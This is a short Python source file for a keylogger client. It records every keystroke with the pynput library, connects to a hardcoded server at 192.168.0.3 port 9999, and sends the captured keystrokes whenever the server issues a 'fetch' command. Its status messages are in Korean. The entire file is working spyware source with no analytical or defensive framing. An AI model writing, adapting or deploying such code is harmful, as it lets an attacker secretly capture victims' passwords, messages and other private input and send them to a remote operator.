# client.py
import socket
from pynput import keyboard

class KeyloggerClient:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.log = []
        self.running = True

    def on_press(self, key):
        try:
            self.log.append(key.char)
        except AttributeError:
            self.log.append(str(key))

    def start_keylogger(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()

    def connect_to_server(self):
        try:
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client_socket.connect((self.server_ip, self.server_port))
            print("서버에 연결되었습니다.")
        except Exception as e:
            print(f"서버 연결 실패: {e}")
            self.running = False

    def handle_server_commands(self):
        while self.running:
            try:
                command = self.client_socket.recv(1024).decode()
                if command == 'fetch':
                    log_data = ''.join(self.log)
                    self.client_socket.send(log_data.encode())
                    print("로그를 서버로 전송했습니다.")
                elif command == 'exit':
                    print("서버로부터 종료 명령을 받았습니다.")
                    self.running = False
            except Exception as e:
                print(f"서버와의 통신 중 에러 발생: {e}")
                self.running = False

        self.client_socket.close()

if __name__ == "__main__":
    server_ip = "192.168.0.3"  # 서버의 IP 주소를 입력하세요
    server_port = 9999         # 서버와 동일한 포트를 사용하세요

    client = KeyloggerClient(server_ip, server_port)
    client.start_keylogger()
    client.connect_to_server()
    client.handle_server_commands()
